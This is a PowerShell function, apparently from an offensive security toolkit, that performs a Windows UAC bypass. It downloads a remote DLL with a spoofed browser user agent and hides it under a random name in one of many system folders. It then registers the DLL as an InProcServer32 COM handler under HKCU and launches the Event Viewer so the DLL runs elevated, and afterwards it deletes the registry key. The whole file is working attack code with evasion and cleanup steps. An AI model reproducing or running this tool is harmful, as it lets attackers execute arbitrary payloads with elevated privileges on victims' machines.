function Invoke-UACBypass {
<# 

.SYNOPSIS
	UAC Bypass

.PARAMETER Help
	Shows Detailed Help.

.PARAMETER List
	Shows Brief Command Help.

.PARAMETER MMCCom
	Downloads a remotely hosted DLL payload and executes a UAC bypass using CLSID 0A29FF9E-7F9C-4437-8B11-F424491E3931 "InProcServer"Event Viewer (mmc.exe) Method. Requires Admin User with UAC set to "Default". (Win 10.0.16299)

.EXAMPLE 
	PS> Invoke-UACBypass -MMCCom -RemoteDll https://srv/file.dll
	
.NOTES
	Author: Fabrizio Siciliano (@0rbz_)

#>

[CmdletBinding()]
param (
	[Parameter(Position=1)]
	[Switch]$Help,
	[switch]$List,
	
	[Parameter(Mandatory = $False)]
	[Switch]$MMCCom,
	[String]$RemoteDll
)
	
$Rs1 = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))

$DataDirs = @(
	("C:\ProgramData\Intel"),
	("C:\ProgramData\Microsoft\Crypto\SystemKeys"),
	("C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys"),
	("C:\ProgramData\Microsoft\Crypto\SystemKeys"),
	("C:\ProgramData\Microsoft\Diagnosis"),
	("C:\ProgramData\Microsoft\Diagnosis\FeedbackHub"),
	("C:\ProgramData\Microsoft\Diagnosis\Scripts"),
	("C:\ProgramData\Microsoft\Network\Downloader"),
	("C:\ProgramData\Microsoft\Office\Heartbeat"),
	("C:\ProgramData\Microsoft\Search\Data"),
	("C:\ProgramData\Microsoft\Search\Data\Applications"),
	("C:\ProgramData\Microsoft\Search\Data\Temp"),
	("C:\ProgramData\Microsoft\Windows\WER\ReportArchive"),
	("C:\ProgramData\Microsoft\Windows\WER\ReportQueue"),
	("C:\ProgramData\Microsoft\Windows\WER\Temp"),
	("C:\ProgramData\WindowsHolographicDevices"),
	("C:\Users\Public\Libraries"),
	("C:\Users\Public\AccountPictures"),
	("C:\Users\Public\Documents"),
	("C:\Users\Public\Downloads"),
	("C:\Users\Public\Music"),
	("C:\Users\Public\Pictures"),
	("C:\Users\Public\Videos"),
	("C:\Users\Public\Roaming"),
	("C:\Windows\debug\WIA"),
	("C:\Windows\ServiceProfiles\LocalService"),
	("C:\Windows\ServiceProfiles\LocalService\AppData"),
	("C:\Windows\ServiceProfiles\LocalService\AppData\Local"),
	("C:\Windows\ServiceProfiles\LocalService\AppData\LocalLow"),
	("C:\Windows\Temp"),
	("C:\windows\system32\config"),
	("C:\Windows\System32\LogFiles\WMI"),
	("C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys")
)

# create a new array from the list above of whose existence is true on the target system.
$NewArray = foreach ($datadir in $datadirs) {
	if (Test-Path $datadir) {
	@($datadir)
	}
}
$datadir = ($newarray[(get-random -Maximum ([array]$newarray).count)])
	
	if ($Help -eq $True) {
		
		Write @"
	
 ### Invoke-UACBypass Help ###
 -----------------------------
 Available Invoke-UACBypass Commands:
 ------------------------------------
 |-----------------------------------------------------------------------------|
 | -MMCCom [-RemoteDll] remote_dll                                             |
 |-----------------------------------------------------------------------------|

   [?] Description: Downloads a remotely hosted DLL payload and executes a UAC 
       bypass using CLSID 0A29FF9E-7F9C-4437-8B11-F424491E3931 "InProcServer"
       Event Viewer (mmc.exe) Method. Requires Admin User with UAC set to 
       "Default". (Win 10.0.16299)
                                                                              
   [?] Usage: Invoke-UACBypass -MMCCom -RemoteDll https://srv/file.dll
   
 \-----------------------------------------------------------------------------/

"@
	}
	elseif ($List -eq $True) {
		Write @"
		
 Invoke-UACBypass Brief Command Usage:
 -------------------------------------
 Invoke-UACBypass -MMCCom -RemoteDll https://srv/file.dll
 
"@
	}
	
	elseif ($MMCCom -and $RemoteDll) {
		
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
			return
		}
		
		# https://twitter.com/UnaPibaGeek/status/1067777096955674625
		$ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
	
		$SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
	
		if ($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1) {
			Write "`n [!] UAC is set to 'Always Notify', Can't bypass with this settings. Requires 'Default' UAC setting.`n"
			Return
		}
		else {
		
			$ClsidRegPath = "HKCU:\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32"
			$ValName = "(Default)"
			
			# download the dll into a random directory and a randomized file name.
			
			$LocalDll = "$DataDir\$Rs1.dll"
			
			$dl = New-Object System.Net.WebClient
			$dl.headers.add("User-Agent", "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5")
			$dl.downloadfile("$RemoteDll", "$LocalDll")
		
			$RegValue = $LocalDll
			New-Item -Path $ClsidRegPath -Force | Out-Null
			New-ItemProperty -Path $ClsidRegPath -Name $ValName -Value $RegValue | Out-Null
		
			$Command = "$env:windir\system32\eventvwr.msc /s"
			Start-Job -Name "MMCCom" -ScriptBlock {Invoke-Expression $Command}
			Stop-Job -Name "MMCCom"
			Sleep 4
			Remove-Item -Path $ClsidRegPath -Force -ErrorAction SilentlyContinue | Out-Null
		}
	}
}